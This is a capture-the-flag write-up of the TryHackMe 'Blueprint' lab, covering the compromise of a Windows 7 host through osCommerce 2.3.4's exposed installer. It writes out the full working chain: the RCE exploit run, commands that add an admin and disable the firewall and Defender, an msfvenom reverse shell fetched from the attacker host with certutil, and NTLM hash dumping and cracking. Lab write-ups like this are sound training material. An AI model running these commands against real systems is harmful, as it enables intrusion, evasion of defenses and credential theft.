# 🏗️ Blueprint: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Windows-informational?style=for-the-badge&logo=windows)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `blueprint.thm` |
| **OS** | Windows 7 Home Basic SP1 x86 |
| **Attack Surface** | osCommerce 2.3.4 unauthenticated RCE via exposed install directory |
| **Privesc** | Shell lands as `nt authority\system` — no escalation required |

Blueprint runs osCommerce 2.3.4 with the install directory left exposed post-setup. The installer allows arbitrary PHP code execution without authentication, yielding an immediate shell as `nt authority\system`. Post-exploitation covers local admin creation, Defender/firewall disable, and NTLM hash dumping via Meterpreter for offline cracking.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 blueprint.thm -oA blueprint-tcp-scan
```

```
80/tcp   open  http     Apache httpd 2.4.23 (Win32)
8080/tcp open  http     Apache httpd 2.4.23 (Win32) — osCommerce 2.3.4
3306/tcp open  mysql    MariaDB
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
```

Port 8080 hosts osCommerce. The `/oscommerce-2.3.4/catalog/install/` path is accessible — the attack surface.

---

## 💀 Initial Access — osCommerce 2.3.4 RCE

The install endpoint allows re-running setup, which writes attacker-controlled PHP into the config. No authentication required.

```bash
python3 exploit.py -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/
```

```
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system
```

Shell drops directly as `nt authority\system`. The Apache process runs as SYSTEM — no privilege escalation needed.

---

## 🔁 Post-Exploitation

### Local Admin + Firewall/Defender Disable

```
RCE_SHELL$ net user localadmin P@ssw0rd /add
RCE_SHELL$ net localgroup administrators localadmin /add
RCE_SHELL$ netsh advfirewall set allprofiles state off
RCE_SHELL$ sc stop WinDefend
RCE_SHELL$ sc config WinDefend start= disabled
```

### Meterpreter Shell (x86 — target is 32-bit)

```bash
# x64 payloads fail — Windows 7 Home Basic is x86
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.28.97 LPORT=443 -f exe > shell.exe

# Deliver via nxc + certutil
nxc smb blueprint.thm -u localadmin -p P@ssw0rd \
  -x 'certutil -urlcache -split -f http://10.14.28.97/shell.exe c:\temp\shell.exe'
```

### NTLM Hash Dump

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
localadmin:1002:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
```

```bash
hashcat -m 1000 hash.txt ./kaonashi.txt
# Lab → googleplus
```

---

## 🗺️ Attack Chain

```
[osCommerce 2.3.4 — port 8080]
    /install/ exposed → unauthenticated RCE → nt authority\system
          │
          ▼
[Post-Exploitation]
    Local admin created → Firewall + Defender disabled
    Meterpreter (x86) → hashdump
    Lab:30e87bf... → googleplus (cracked)
```

---

## 📌 Key Takeaways

- osCommerce's install directory must be removed after setup — it allows unauthenticated code execution by design
- Web server processes on Windows should never run as SYSTEM; use a dedicated low-privilege service account
- Architecture mismatch (x64 payload on x86 target) is a common failure on older Windows boxes — verify `arch` before generating payloads
- `rockyou.txt` alone won't crack everything; maintain larger wordlists (kaonashi, hob064) for NT hashes

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Credential Access | OS Credential Dumping: SAM | [T1003.002](https://attack.mitre.org/techniques/T1003/002) |
| Lateral Movement | Use Alternate Authentication Material: Pass the Hash | [T1550.002](https://attack.mitre.org/techniques/T1550/002) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `exploit.py` | osCommerce 2.3.4 unauthenticated RCE via exposed install directory |
| `msfvenom` | Generate x86 Windows reverse shell payload |
| `nxc` | SMB command execution for payload delivery via certutil |
| `hashcat` | Offline NTLM hash cracking |

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`TBD`

</details>

<details>
<summary><code>root.txt</code></summary>

`TBD`

</details>
